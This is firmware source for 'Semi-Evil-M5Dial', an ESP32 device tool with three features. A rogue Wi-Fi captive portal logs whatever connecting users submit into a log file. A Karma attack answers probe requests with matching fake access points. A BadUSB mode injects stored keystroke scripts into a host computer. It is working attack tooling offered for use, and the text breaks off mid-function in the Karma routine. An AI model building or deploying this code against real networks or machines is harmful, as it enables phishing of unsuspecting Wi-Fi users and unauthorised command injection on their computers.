#include <SPIFFS.h>
#include "M5Dial.h"
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <vector>
#include <ArduinoJson.h>
#include <string>
#include <esp_wifi.h>
#include <esp_system.h>
#include <Preferences.h>
#include "FS.h"
#include "USB.h"
#include "USBHIDKeyboard.h"

// Globals
WebServer server(80);
DNSServer dnsServer;
Preferences preferences;
USBHIDKeyboard Keyboard;

const byte DNS_PORT = 53;

String ssid = "Semi-Evil-M5Dial";
const char* password = "";

std::vector<String> ssidList;
std::vector<std::string> whitelist = {"neighbours-box", "7h30th3r0n3", "Evil-M5Core2"};

int currentIndex = 0;
long oldPosition = -999;
bool isPortalRunning = false;
unsigned long lastPressTime = 0;
const int encoderMoveThreshold = 4;
const unsigned long doublePressThreshold = 500;

int screenBrightness = 128;  // Global brightness
bool debugMode = true;       // true = Normal (debug) mode, false = HID mode
bool verboseDebug = false;
bool pendingReset = false;
String pendingFile = "";

// For Karma Attack
bool isKarmaRunning = false;
bool isAutoKarmaActive = false;
bool newSSIDAvailable = false;
bool isAPDeploying = false;
char lastSSID[33] = {0};
char lastDeployedSSID[33] = {0};
unsigned long lastProbeDisplayUpdate = 0;
int probeDisplayState = 0;
const int autoKarmaAPDuration = 20000;
const int maxSSIDs = 100;

// Menu items
const char* menuItems[] = {
    "Start Portal",
    "Saved SSID",
    "Start Karma",
    "BadUSB",
    "About",
    "Settings"
};
const int menuItemsCount = sizeof(menuItems) / sizeof(menuItems[0]);

// Settings menu items (dynamic)
int settingsItemsCount = 5; 

// Script-related globals
std::vector<String> scriptFileNames;
int scriptCurrentFileIndex = 0;
long scriptOldPosition = -999;

const float defaultTextSize = 0.4;
uint8_t display_rotation = 0;

enum ScreenState {
    MENU_SCREEN,
    PORTAL_SCREEN,
    KARMA_SCREEN,
    EXECUTE_SCRIPT_SCREEN,
    ABOUT_SCREEN,
    SETTINGS_SCREEN
};
ScreenState currentScreen = MENU_SCREEN;

enum DisplayState {
    DISPLAY_NONE,
    DISPLAY_WAITING_FOR_PROBE,
    DISPLAY_AP_STATUS
};
DisplayState currentDisplayState = DISPLAY_NONE;

// Forward declarations of functions
void drawMenu(int index);
void returnToMainMenu();
void stopAutoKarma();
void autoKarmaPacketSniffer(void* buf, wifi_promiscuous_pkt_type_t type);
void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPDuration);
void readFileToSerial(fs::FS &fs, const char *path);
void executeKeystrokes(const char *filename);
void startCaptivePortal();
void handlePortalScreen();
void setupWebServerRoutes();
void handleFormSubmit();
void logData(String data);
void selectSSID();
void startAutoKarma();
void loopAutoKarma();
void activateAPForAutoKarma(const char* ssid);
void displayWaitingForProbe();
void powerOffDevice();
void drawSettingsMenu(int index);
void handleSettingsScreen(long newPosition);
void enterExecuteScriptScreen();
void handleExecuteScriptScreen();
void listTxtFiles(fs::FS &fs, const char *dirname);
void drawScriptMenu(int index);
void saveSSID(const String& newSSID);
void saveSelectedSSID(const String& selectedSSID);
String cleanSSID(String ssid);
void drawListMenu(const char* items[], int itemCount, int index, uint16_t highlightColor, uint16_t textColor, uint16_t ringColor);
void drawRing(uint16_t color);
void centerText(const String &text, int16_t yOffset = 0);
void displayAboutScreen();
void adjustBrightness(long newPosition, long &brightnessOldPosition);
void toggleMode();

// Toggle Debug/HID Mode
void toggleMode() {
    debugMode = !debugMode;
    if (!preferences.begin("settings", false)) {
        Serial.println("Failed to initialize Preferences!");
        return;
    }
    preferences.putBool("debugMode", debugMode);
    preferences.putBool("pendingReset", true);
    preferences.end();
    M5Dial.Display.clear();
    if (debugMode) {
        M5Dial.Display.drawString("Switching to Normal Mode", M5Dial.Display.width() / 2, M5Dial.Display.height() / 2);
        if (verboseDebug) Serial.println("Now in Normal Mode.");
    } else {
        M5Dial.Display.drawString("Switching to BadUSB Mode", M5Dial.Display.width() / 2, M5Dial.Display.height() / 2);
        if (verboseDebug) Serial.println("Now in BadUSB Mode.");
    }
    delay(1500);
    Keyboard.end();
    esp_restart();
}

void setup() {
    Serial.begin(115200);
    auto cfg = M5.config();
    M5Dial.begin(cfg, true, false);

    if (!preferences.begin("settings", false)) {
        Serial.println("Failed to initialize Preferences!");
        debugMode = true;
        verboseDebug = true; // default if fail
    } else {
        debugMode = preferences.getBool("debugMode", true);
        verboseDebug = preferences.getBool("verboseDebug", false);
        pendingReset = preferences.getBool("pendingReset", false);
        pendingFile = preferences.getString("pendingFile", "");
        screenBrightness = preferences.getInt("brightness", 128);
        preferences.end();
    }

    M5Dial.Display.setBrightness(screenBrightness);
    M5Dial.Display.setTextColor(WHITE);
    M5Dial.Display.setTextDatum(middle_center);
    M5Dial.Display.setFont(&fonts::Orbitron_Light_32);
    M5Dial.Display.setTextSize(defaultTextSize);

    if (!SPIFFS.begin(true)) {
        Serial.println("An Error has occurred while mounting SPIFFS");
        return;
    }

    if (pendingReset) {
        if (preferences.begin("settings", false)) {
            preferences.remove("pendingReset");
            preferences.end();
        }
        esp_restart();
    }

    // If in HID mode, initialize Keyboard
    if (!debugMode) {
        M5Dial.Display.drawString("BadUSB Mode", M5Dial.Display.width() / 2, M5Dial.Display.height() / 2);
        Keyboard.begin();
        USB.begin();
        delay(500);

        if (!pendingFile.isEmpty()) {
            M5Dial.Display.clear();
            M5Dial.Display.drawString("Executing Pending File...", M5Dial.Display.width() / 2, M5Dial.Display.height() / 2);
            delay(5000);
            executeKeystrokes(pendingFile.c_str());
            if (preferences.begin("settings", false)) {
                preferences.remove("pendingFile");
                preferences.end();
            }
            M5Dial.Display.drawString("Execution Done", M5Dial.Display.width() / 2, (M5Dial.Display.height() / 2) + 40);
            delay(2000);
            // After executing pending file, just return.
            return;
        }
    } else {
        if (verboseDebug) Serial.println("Normal Mode Enabled");
        M5Dial.Display.drawString("Normal Mode", M5Dial.Display.width() / 2, M5Dial.Display.height() / 2);
    }

    // Display image if exists
    const char* imagePath = "/logo.bmp";
    if (SPIFFS.exists(imagePath)) {
        Serial.println("Image file found, displaying image.");

        int16_t x_center1 = (M5Dial.Display.width() - 240) / 2;
        int16_t y_center1 = (M5Dial.Display.height() - 135) / 2;

        M5Dial.Display.setRotation(display_rotation);
        M5Dial.Display.clear();
        M5Dial.Display.drawBmpFile(SPIFFS, imagePath, x_center1, y_center1);
        delay(5000);
        M5Dial.Display.clear();
    } else {
        Serial.println("Image file not found, skipping image display.");
    }

    // Load selected SSID
    {
        File file = SPIFFS.open("/selectedSSID.json", "r");
        if (file) {
            JsonDocument doc;
            DeserializationError error = deserializeJson(doc, file);
            if (!error) {
                String selectedSSID = doc["selectedSSID"].as<String>();
                if (!selectedSSID.isEmpty()) {
                    ssid = selectedSSID;
                    if (verboseDebug) Serial.println("Loaded selected SSID: " + ssid);
                }
            }
            file.close();
        }
    }

    // Load SSIDs
    {
        File file = SPIFFS.open("/SSID.json", "r");
        if (file) {
            JsonDocument doc;
            DeserializationError error = deserializeJson(doc, file);
            if (!error) {
                ssidList.clear();
                for (JsonVariant v : doc["ssids"].as<JsonArray>()) {
                    String s = v.as<String>();
                    ssidList.push_back(s);
                }
                if (debugMode && verboseDebug) {
                    Serial.printf("Total SSIDs loaded: %d\n", ssidList.size());
                }
            }
            file.close();
        }
    }

    M5Dial.Display.fillScreen(BLACK);
    drawMenu(currentIndex);
}

void loop() {
    M5Dial.update();
    long newPosition = M5Dial.Encoder.read();

    switch (currentScreen) {
        case MENU_SCREEN:
        {
            if (abs(newPosition - oldPosition) >= encoderMoveThreshold) {
                M5Dial.Speaker.tone(8000, 20);
                oldPosition = newPosition;
                currentIndex = (newPosition / encoderMoveThreshold + menuItemsCount) % menuItemsCount;
                if (currentIndex < 0) {
                    currentIndex += menuItemsCount;
                }
                if (debugMode && verboseDebug) {
                    Serial.printf("Navigating main menu, index: %d\n", currentIndex);
                }
                drawMenu(currentIndex);
            }

            static unsigned long pressStartTime = 0;
            static bool isBtnAPressed = false;
            if (M5Dial.BtnA.wasPressed()) {
                isBtnAPressed = true;
                pressStartTime = millis();
            }
            if (isBtnAPressed && M5Dial.BtnA.wasReleased()) {
                unsigned long pressDuration = millis() - pressStartTime;
                isBtnAPressed = false;
                if (pressDuration < 1000) {
                    switch (currentIndex) {
                        case 0: // Start Portal
                            if (debugMode && !isPortalRunning) startCaptivePortal();
                            break;
                        case 1: // Saved SSID
                            if (debugMode && !ssidList.empty()) selectSSID();
                            break;
                        case 2: // Start Karma
                            if (debugMode && !isKarmaRunning) startAutoKarma();
                            break;
                        case 3: // BadUSB
                            currentScreen = EXECUTE_SCRIPT_SCREEN;
                            enterExecuteScriptScreen();
                            break;
                        case 4: // About
                            currentScreen = ABOUT_SCREEN;
                            displayAboutScreen();
                            break;
                        case 5: // Settings
                            currentScreen = SETTINGS_SCREEN;
                            drawSettingsMenu(0);
                            break;
                    }
                }
            }
        }
        break;

        case PORTAL_SCREEN:
            if (debugMode) handlePortalScreen();
            break;

        case KARMA_SCREEN:
            if (debugMode) loopAutoKarma();
            break;

        case EXECUTE_SCRIPT_SCREEN:
            handleExecuteScriptScreen();
            break;

        case ABOUT_SCREEN:
            if (M5Dial.BtnA.wasPressed()) {
                currentScreen = MENU_SCREEN;
                drawMenu(currentIndex);
            }
            break;

        case SETTINGS_SCREEN:
            handleSettingsScreen(newPosition);
            break;
    }

    delay(10);
}

// Drawing Menus
void drawMenu(int index) {
    if (index < 0 || index >= menuItemsCount) {
        index = 0;
    }
    drawListMenu(menuItems, menuItemsCount, index, YELLOW, WHITE, YELLOW);
}

void drawListMenu(const char* items[], int itemCount, int index, uint16_t highlightColor, uint16_t textColor, uint16_t ringColor) {
    M5Dial.Display.fillScreen(BLACK);
    drawRing(ringColor);

    const int itemHeight = 25;
    const int numVisibleItems = 4; // show more items for clarity

    for (int i = 0; i < numVisibleItems; i++) {
        int itemIndex = (index + i - 1 + itemCount) % itemCount;
        int yPos = (M5Dial.Display.height() / 2) + ((i - 1) * itemHeight);

        if (i == 1) {
            M5Dial.Display.setTextColor(highlightColor);
        } else {
            M5Dial.Display.setTextColor(textColor);
        }

        String displayText = String(items[itemIndex]);
        if (M5Dial.Display.textWidth(displayText) > M5Dial.Display.width() - 20) {
            displayText = displayText.substring(0, (M5Dial.Display.width() - 20) / M5Dial.Display.fontHeight()) + "...";
        }

        M5Dial.Display.setTextSize(defaultTextSize);
        M5Dial.Display.drawString(displayText, M5Dial.Display.width() / 2, yPos);
    }
}

void drawRing(uint16_t color) {
    int16_t centerX = M5Dial.Display.width() / 2;
    int16_t centerY = M5Dial.Display.height() / 2;
    int16_t radius = min(M5Dial.Display.width(), M5Dial.Display.height()) / 2;

    for (int16_t r = radius; r > radius - 10; r--) {
        M5Dial.Display.drawCircle(centerX, centerY, r, color);
    }
}

// Utility function to center text on the display with a vertical offset
void centerText(const String &text, int16_t yOffset) {
    int16_t textWidth = M5Dial.Display.textWidth(text);
    int16_t x = (M5Dial.Display.width() - textWidth) / 2;
    int16_t y = (M5Dial.Display.height() / 2) + yOffset;
    M5Dial.Display.setCursor(x, y);
    M5Dial.Display.println(text);
}

// About Screen
void displayAboutScreen() {
    M5Dial.Display.clear();
    drawRing(TFT_ORANGE);

    M5Dial.Display.setTextSize(defaultTextSize);
    M5Dial.Display.setTextColor(TFT_WHITE);

    int16_t yPos = 40;
    int16_t textWidth = M5Dial.Display.textWidth("Semi-Evil-M5Dial");
    int16_t xPos = (M5Dial.Display.width() - textWidth) / 2;
    M5Dial.Display.setCursor(xPos, yPos);
    M5Dial.Display.println("Semi-Evil-M5Dial");

    yPos += 30;
    textWidth = M5Dial.Display.textWidth("Version: 1.3.0");
    xPos = (M5Dial.Display.width() - textWidth) / 2;
    M5Dial.Display.setCursor(xPos, yPos);
    M5Dial.Display.println("Version: 1.3.0");

    yPos += 30;
    textWidth = M5Dial.Display.textWidth("By: 7h30th3r0n3");
    xPos = (M5Dial.Display.width() - textWidth) / 2;
    M5Dial.Display.setCursor(xPos, yPos);
    M5Dial.Display.println("By: 7h30th3r0n3");

    yPos += 30;
    textWidth = M5Dial.Display.textWidth("& dagnazty");
    xPos = (M5Dial.Display.width() - textWidth) / 2;
    M5Dial.Display.setCursor(xPos, yPos);
    M5Dial.Display.println("& dagnazty");

    yPos = M5Dial.Display.height() - 60;
    M5Dial.Display.setTextSize(0.4);
    textWidth = M5Dial.Display.textWidth("Press to return to menu");
    xPos = (M5Dial.Display.width() - textWidth) / 2;
    M5Dial.Display.setCursor(xPos, yPos);
    M5Dial.Display.println("Press to return to menu");
}

// SSID Handling
void saveSSID(const String& newSSID) {
    for (const auto& s : ssidList) {
        if (s == newSSID) return;
    }

    ssidList.push_back(newSSID);
    if (ssidList.size() > maxSSIDs) {
        ssidList.erase(ssidList.begin());
        if (debugMode && verboseDebug) {
            Serial.println("Removed oldest SSID to maintain the limit.");
        }
    }

    File file = SPIFFS.open("/SSID.json", "w");
    if (!file) {
        if (debugMode && verboseDebug) {
            Serial.println("Failed to open SSID.json for writing");
        }
        return;
    }

    JsonDocument doc;
    JsonArray array = doc["ssids"].to<JsonArray>();
    for (const auto& s : ssidList) {
        array.add(s);
    }

    if (serializeJson(doc, file) == 0 && debugMode && verboseDebug) {
        Serial.println("Failed to write to file");
    }

    file.close();
    if (debugMode && verboseDebug) {
        Serial.println("New SSID saved and list updated.");
    }
}

void saveSelectedSSID(const String& selectedSSID) {
    File file = SPIFFS.open("/selectedSSID.json", "w");
    if (!file) {
        if (debugMode && verboseDebug) {
            Serial.println("Failed to open selectedSSID.json for writing");
        }
        return;
    }
    JsonDocument doc;
    doc["selectedSSID"] = selectedSSID;
    if (serializeJson(doc, file) == 0 && debugMode && verboseDebug) {
        Serial.println("Failed to write selected SSID");
    }
    file.close();
    if (debugMode && verboseDebug) {
        Serial.println("Selected SSID saved: " + selectedSSID);
    }
}

String cleanSSID(String ssid) {
    ssid.trim();
    int rIndex = ssid.indexOf('\r');
    if (rIndex != -1) ssid.remove(rIndex);
    int nIndex = ssid.indexOf('\n');
    if (nIndex != -1) ssid.remove(nIndex);
    return ssid;
}

// Captive Portal
void startCaptivePortal() {
    if (debugMode && verboseDebug) {
        Serial.println("Starting Captive Portal...");
    }

    // Configure WiFi channel and SSID
    WiFi.mode(WIFI_AP_STA);
    WiFi.setSleep(false); // Disable sleep for better reliability
    WiFi.setTxPower(WIFI_POWER_19_5dBm); // Max power
    
    // Clean SSID to ASCII only
    String cleanSSID = ssid;
    cleanSSID.replace(" ", "_");
    cleanSSID.replace("\"", "");
    cleanSSID.replace("'", "");
    cleanSSID.replace("\\", "");
    cleanSSID.replace("/", "");
    
    // Start AP on channel 6 (commonly supported)
    if (!WiFi.softAP(cleanSSID.c_str(), password, 6, 0, 4)) {
        if (debugMode && verboseDebug) {
            Serial.println("Failed to start AP, retrying...");
        }
        delay(500);
        WiFi.mode(WIFI_STA);
        delay(500);
        WiFi.mode(WIFI_AP_STA);
        if (!WiFi.softAP(cleanSSID.c_str(), password, 6, 0, 4)) {
            if (debugMode && verboseDebug) {
                Serial.println("Failed to start AP after retry. Check config.");
            }
            return;
        }
    }
    
    if (debugMode && verboseDebug) {
        Serial.println("AP started with SSID: " + cleanSSID);
        Serial.println("WiFi channel: 6");
        Serial.println("Max connections: 4");
    }

    IPAddress myIP = WiFi.softAPIP();
    if (debugMode && verboseDebug) {
        Serial.print("AP IP address: ");
        Serial.println(myIP);
    }

    M5Dial.Display.clear();
    String connectText = "Connect to:";
    String ipText = myIP.toString() + "/logs";
    int16_t connectTextX = (M5Dial.Display.width() - M5Dial.Display.textWidth(connectText)) / 2;
    int16_t ipTextY1 = M5Dial.Display.height() / 2 - 40;
    M5Dial.Display.setCursor(connectTextX, ipTextY1);
    M5Dial.Display.println(connectText);

    int16_t ipTextX2 = (M5Dial.Display.width() - M5Dial.Display.textWidth(ipText)) / 2;
    int16_t ipTextY2 = ipTextY1 + 30;
    M5Dial.Display.setCursor(ipTextX2, ipTextY2);
    M5Dial.Display.println(ipText);
    drawRing(TFT_BLUE);

    // Add captive portal redirect handler
    server.on("/generate_204", HTTP_GET, []() {
        server.sendHeader("Location", "http://" + WiFi.softAPIP().toString());
        server.send(302);
    });
    
    server.on("/hotspot-detect.html", HTTP_GET, []() {
        server.sendHeader("Location", "http://" + WiFi.softAPIP().toString());
        server.send(302);
    });

    dnsServer.start(DNS_PORT, "*", myIP);
    setupWebServerRoutes();
    server.begin();
    isPortalRunning = true;
    if (debugMode && verboseDebug) {
        Serial.println("HTTP server started");
        Serial.println("Captive portal active at http://" + myIP.toString());
    }
    currentScreen = PORTAL_SCREEN;
}

void stopCaptivePortal() {
    if (isPortalRunning) {
        server.close();
        dnsServer.stop();
        WiFi.softAPdisconnect(true);
        isPortalRunning = false;
        if (debugMode && verboseDebug) {
            Serial.println("Captive portal stopped");
        }
        WiFi.mode(WIFI_STA);
        delay(500);
    }
}

void handlePortalScreen() {
    if (debugMode && isPortalRunning) {
        dnsServer.processNextRequest();
        server.handleClient();
        int clientCount = WiFi.softAPgetStationNum();
        String clientsText = "Clients: " + String(clientCount);

        int16_t clientsTextX = (M5Dial.Display.width() - M5Dial.Display.textWidth(clientsText)) / 2;
        int16_t clientsTextY = M5Dial.Display.height() / 2 + 30;

        M5Dial.Display.fillRect(0, clientsTextY - 5, M5Dial.Display.width(), M5Dial.Display.fontHeight() + 10, TFT_BLACK);
        M5Dial.Display.setCursor(clientsTextX, clientsTextY);
        M5Dial.Display.setTextSize(defaultTextSize);
        M5Dial.Display.setTextColor(WHITE, BLACK);
        M5Dial.Display.println(clientsText);
        drawRing(TFT_BLUE);
    }

    if (M5Dial.BtnA.wasPressed()) {
        if (debugMode && isPortalRunning) {
            stopCaptivePortal();
        }
        currentScreen = MENU_SCREEN;
        drawMenu(currentIndex);
    }
}

void setupWebServerRoutes() {
    server.on("/upload", HTTP_GET, []() {
        // Hardcode the entire HTML as a raw string literal
        // (Requires C++11 or later)
        const char htmlPage[] = R"HTML(
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Device Control Panel</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #f4f4f4;
                margin: 0;
                padding: 20px;
            }
            .container {
                max-width: 800px;
                margin: 0 auto;
                background: white;
                padding: 20px;
                border-radius: 8px;
                box-shadow: 0 0 10px rgba(0,0,0,0.1);
            }
            h1 {
                color: #333;
                text-align: center;
            }
            .section {
                margin-bottom: 30px;
            }
            .file-upload {
                border: 2px dashed #ccc;
                padding: 20px;
                text-align: center;
                margin-bottom: 20px;
            }
            .controls {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
                gap: 10px;
            }
            button {
                background-color: #4CAF50;
                color: white;
                border: none;
                padding: 15px;
                border-radius: 5px;
                cursor: pointer;
                font-size: 16px;
            }
            button:hover {
                background-color: #45a049;
            }
            .file-list {
                margin-top: 20px;
            }
            .file-item {
                display: flex;
                justify-content: space-between;
                padding: 10px;
                border-bottom: 1px solid #eee;
            }
            .status {
                margin-top: 20px;
                padding: 15px;
                background-color: #f8f8f8;
                border-radius: 5px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Device Control Panel</h1>
            
            <div class="section">
                <h2>File Management</h2>
                <div class="file-upload">
                    <input type="file" id="fileInput" multiple>
                    <button onclick="uploadFiles()">Upload Files</button>
                </div>
                <div class="file-list" id="fileList">
                    <!-- Files will be listed here -->
                </div>
            </div>

        </div>

        <script>
            async function uploadFiles() {
                const fileInput = document.getElementById('fileInput');
                const files = fileInput.files;
                const formData = new FormData();
                
                for (let i = 0; i < files.length; i++) {
                    formData.append('files', files[i]);
                }

                try {
                    const response = await fetch('/upload', {
                        method: 'POST',
                        body: formData
                    });
                    
                    const result = await response.json();
                    if (result.success) {
                        updateFileList();
                        showStatus('Files uploaded successfully');
                    } else {
                        showStatus('Error uploading files');
                    }
                } catch (error) {
                    showStatus('Upload failed: ' + error.message);
                }
            }

            async function updateFileList() {
                try {
                    const response = await fetch('/files');
                    const files = await response.json();
                    const fileList = document.getElementById('fileList');
                    fileList.innerHTML = files.map(file => `
                        <div class="file-item">
                            <span>${file.name}</span>
                            <button onclick="deleteFile('${file.name}')">Delete</button>
                        </div>
                    `).join('');
                } catch (error) {
                    showStatus('Error fetching file list');
                }
            }

            async function deleteFile(filename) {
                try {
                    // Call the query-param-based endpoint
                    const response = await fetch(`/deleteFile?filename=${encodeURIComponent(filename)}`, {
                    method: 'DELETE'
                    });
                    const result = await response.json();
                    if (result.success) {
                    updateFileList();
                    showStatus('File deleted successfully');
                    } else {
                    showStatus('Error deleting file');
                    }
                } catch (error) {
                    showStatus('Delete failed: ' + error.message);
                }
            }

            async function sendCommand(command) {
                try {
                    const response = await fetch(`/command/${command}`, {
                        method: 'POST'
                    });
                    const result = await response.json();
                    showStatus(result.message || 'Command executed');
                } catch (error) {
                    showStatus('Command failed: ' + error.message);
                }
            }

            function showStatus(message) {
                const status = document.getElementById('statusMessage');
                if (!status) {
                    // If there's no status element in the HTML, you can do something else
                    console.log('STATUS:', message);
                    return;
                }
                status.textContent = message;
                setTimeout(() => status.textContent = '', 3000);
            }

            // Initial file list load
            updateFileList();
        </script>
    </body>
    </html>
    )HTML";

        // Send the page to the client
        server.send(200, "text/html", htmlPage);
    });


    // Serve static files from SPIFFS
    server.onNotFound([]() {
        // First check if the requested file exists
        String path = server.uri();
        if (path.endsWith("/")) {
            path += "index.html";
        }

        if (SPIFFS.exists(path)) {
            // Determine MIME type from file extension
            String contentType = "text/plain";
            if (path.endsWith(".html")) contentType = "text/html";
            else if (path.endsWith(".css")) contentType = "text/css";
            else if (path.endsWith(".js")) contentType = "application/javascript";
            else if (path.endsWith(".png")) contentType = "image/png";
            else if (path.endsWith(".jpg") || path.endsWith(".jpeg")) contentType = "image/jpeg";
            else if (path.endsWith(".gif")) contentType = "image/gif";
            else if (path.endsWith(".ico")) contentType = "image/x-icon";
            else if (path.endsWith(".txt")) contentType = "text/plain";
            else if (path.endsWith(".json")) contentType = "application/json";

            File file = SPIFFS.open(path, "r");
            if (!file) {
                server.send(404, "text/plain", "File not found");
                return;
            }
            server.streamFile(file, contentType);
            file.close();
            return;
        }

        server.send(404, "text/plain", "File not found");

        // If you really need to do something with `server.uri()` after this,
        // rename it to avoid redeclaration:
        String path404 = server.uri();
        if (path404.endsWith("/")) {
            path404 += "index.html";
        }

        // Check if file exists
        if (!SPIFFS.exists(path)) {
            server.send(404, "text/plain", "File not found");
            return;
        }

        // Determine MIME type from file extension
        String contentType = "text/plain";
        if (path.endsWith(".html")) contentType = "text/html";
        else if (path.endsWith(".css")) contentType = "text/css";
        else if (path.endsWith(".js")) contentType = "application/javascript";
        else if (path.endsWith(".png")) contentType = "image/png";
        else if (path.endsWith(".jpg") || path.endsWith(".jpeg")) contentType = "image/jpeg";
        else if (path.endsWith(".gif")) contentType = "image/gif";
        else if (path.endsWith(".ico")) contentType = "image/x-icon";
        else if (path.endsWith(".txt")) contentType = "text/plain";
        else if (path.endsWith(".json")) contentType = "application/json";

        File file = SPIFFS.open(path, "r");
        if (!file) {
            server.send(404, "text/plain", "File not found");
            return;
        }
        server.streamFile(file, contentType);
        file.close();
    });

    // Special handlers for captive portal redirects
    server.on("/generate_204", HTTP_GET, []() {
        server.sendHeader("Location", "http://" + WiFi.softAPIP().toString());
        server.send(302);
    });
    
    server.on("/hotspot-detect.html", HTTP_GET, []() {
        server.sendHeader("Location", "http://" + WiFi.softAPIP().toString());
        server.send(302);
    });

    // Form submission handler
    server.on("/submit", HTTP_POST, handleFormSubmit);

    // Logs endpoint
    server.on("/logs", HTTP_GET, []() {
        File logFile = SPIFFS.open("/log.txt", "r");
        if (logFile) {
            server.streamFile(logFile, "text/plain");
            logFile.close();
        } else {
            server.send(404, "text/plain", "No logs found.");
        }
    });

    // Enhanced file upload handler with directory support
    server.on("/upload", HTTP_POST, []() {
        server.send(200, "application/json", "{\"success\":true}");
    }, []() {
        static File uploadFile;
        HTTPUpload& upload = server.upload();
        
        if (upload.status == UPLOAD_FILE_START) {
            String filename = upload.filename;
            if (!filename.startsWith("/")) {
                filename = "/" + filename;
            }
            
            // Create directories if needed
            int lastSlash = filename.lastIndexOf('/');
            if (lastSlash > 0) {
                String dirPath = filename.substring(0, lastSlash);
                if (!SPIFFS.exists(dirPath)) {
                    SPIFFS.mkdir(dirPath);
                    if (debugMode && verboseDebug) {
                        Serial.println("Created directory: " + dirPath);
                    }
                }
            }
            
            uploadFile = SPIFFS.open(filename, "w");
            if (!uploadFile) {
                if (debugMode && verboseDebug) {
                    Serial.println("Failed to create file: " + filename);
                }
                return;
            }
        } else if (upload.status == UPLOAD_FILE_WRITE) {
            if (uploadFile) {
                uploadFile.write(upload.buf, upload.currentSize);
            }
        } else if (upload.status == UPLOAD_FILE_END) {
            if (uploadFile) {
                uploadFile.close();
                if (debugMode && verboseDebug) {
                    Serial.println("File upload complete: " + upload.filename);
                }
            }
        }
    });

    // File list handler
    server.on("/files", HTTP_GET, []() {
        File root = SPIFFS.open("/");
        File file = root.openNextFile();
        JsonDocument doc;
        JsonArray files = doc.to<JsonArray>();
        
        while (file) {
            if (!file.isDirectory()) {
                JsonObject fileInfo = files.add<JsonObject>();
                String fileName = String(file.name());
                if (fileName.startsWith("/")) {
                    fileName = fileName.substring(1);
                }
                fileInfo["name"] = fileName;
                fileInfo["size"] = file.size();
            }
            file = root.openNextFile();
        }
        
        String response;
        serializeJson(doc, response);
        server.send(200, "application/json", response);
    });

    // File delete handler
    server.on("/deleteFile", HTTP_DELETE, []() {
        // Check if we have a "filename" argument
        if (!server.hasArg("filename")) {
            server.send(400, "application/json", R"({"success":false,"error":"No filename argument"})");
            return;
        }
        
        // Grab the filename argument, e.g. "myFile.txt"
        String fileArg = server.arg("filename");
        // Convert it to an absolute path, e.g. "/myFile.txt"
        String filePath = "/" + fileArg;
        
        // Attempt to delete from SPIFFS
        if (SPIFFS.remove(filePath)) {
            server.send(200, "application/json", R"({"success":true})");
            if (debugMode && verboseDebug) {
                Serial.println("Deleted file: " + filePath);
            }
        } else {
            server.send(404, "application/json", R"({"success":false})");
            if (debugMode && verboseDebug) {
                Serial.println("Failed to delete file: " + filePath);
            }
        }
    });


    // Command handler
    server.on("/command/{command}", HTTP_POST, []() {
        String command = server.pathArg(0);
        String message = "Command executed: " + command;
        
        // Add actual command handling logic here
        // For now just return success
        server.send(200, "application/json", "{\"message\":\"" + message + "\"}");
        
        if (debugMode && verboseDebug) {
            Serial.println(message);
        }
    });

    server.onNotFound([]() {
        File file = SPIFFS.open("/index.html", "r");
        if (!file) {
            if (debugMode && verboseDebug) {
                Serial.println("File not found: /index.html on NotFound");
            }
            server.send(404, "text/plain", "File not found");
            return;
        }
        server.streamFile(file, "text/html");
        file.close();
    });
}

void handleFormSubmit() {
    if (server.hasArg("plain")) {
        String body = server.arg("plain");
        logData(body);
        server.send(200, "application/json", "{\"status\":\"ok\"}");
    } else {
        server.send(400, "application/json", "{\"status\":\"fail\"}");
    }
}

void logData(String data) {
    File logFile = SPIFFS.open("/log.txt", FILE_APPEND);
    if (logFile) {
        logFile.println(data);
        logFile.close();
        if (debugMode && verboseDebug) {
            Serial.println("Data logged.");
        }
    } else {
        if (debugMode && verboseDebug) {
            Serial.println("Failed to open log file.");
        }
    }
}

// SSID Selection
void drawSSIDMenu(int index) {
    int count = (int)ssidList.size() + 1; 
    const char** ssidArray = new const char*[count];
    for (size_t i = 0; i < ssidList.size(); i++) {
        ssidArray[i] = ssidList[i].c_str();
    }
    ssidArray[count - 1] = "Back";

    drawListMenu(ssidArray, count, index, PURPLE, WHITE, PURPLE);
    delete[] ssidArray;
}

void selectSSID() {
    if (!debugMode) return; // Only in debug mode

    currentScreen = PORTAL_SCREEN;
    delay(200);

    if (ssidList.empty()) {
        returnToMainMenu();
        return;
    }

    int ssidIndex = 0;
    long ssidOldPosition = -999;
    unsigned long pressStartTime = 0;
    bool isBtnAPressed = false;

    int count = (int)ssidList.size() + 1; 
    while (true) {
        M5Dial.update();
        long newPosition = M5Dial.Encoder.read();

        if (abs(newPosition - ssidOldPosition) >= encoderMoveThreshold) {
            M5Dial.Speaker.tone(8000, 20);
            ssidOldPosition = newPosition;
            ssidIndex = (newPosition / encoderMoveThreshold + count) % count;
            drawSSIDMenu(ssidIndex);
        }

        if (M5Dial.BtnA.wasPressed()) {
            isBtnAPressed = true;
            pressStartTime = millis();
        }

        if (isBtnAPressed && M5Dial.BtnA.wasReleased()) {
            unsigned long pressDuration = millis() - pressStartTime;
            isBtnAPressed = false;
            if (pressDuration < 1000) {
                if (ssidIndex == count - 1) {
                    returnToMainMenu();
                    break;
                } else {
                    String selectedSSID = cleanSSID(ssidList[ssidIndex]);
                    ssid = selectedSSID;
                    WiFi.softAP(ssid.c_str(), password);
                    saveSelectedSSID(ssid);
                    if (debugMode && verboseDebug) {
                        Serial.println("Rebooting to apply SSID change...");
                    }
                    delay(500);
                    esp_restart();
                }
            }
        }

        if (M5Dial.BtnA.pressedFor(1000)) {
            if (debugMode && verboseDebug) {
                Serial.println("BtnA held, returning to main menu.");
            }
            returnToMainMenu();
            break;
        }

        delay(10);
    }
}

// Return to main menu
void returnToMainMenu() {
    drawMenu(currentIndex);
    currentScreen = MENU_SCREEN;
    lastPressTime = 0;
    if (debugMode && verboseDebug) {
        Serial.println("Returning to main menu...");
    }
}

// Karma Attack
void startAutoKarma() {
    if (!debugMode) return; 
    if (isKarmaRunning) {
        if (debugMode && verboseDebug) {
            Serial.println("Cannot start Karma attack, it's already running.");
        }
        return;
    }

    isAutoKarmaActive = true;
    isKarmaRunning = true;
    currentScreen = KARMA_SCREEN;

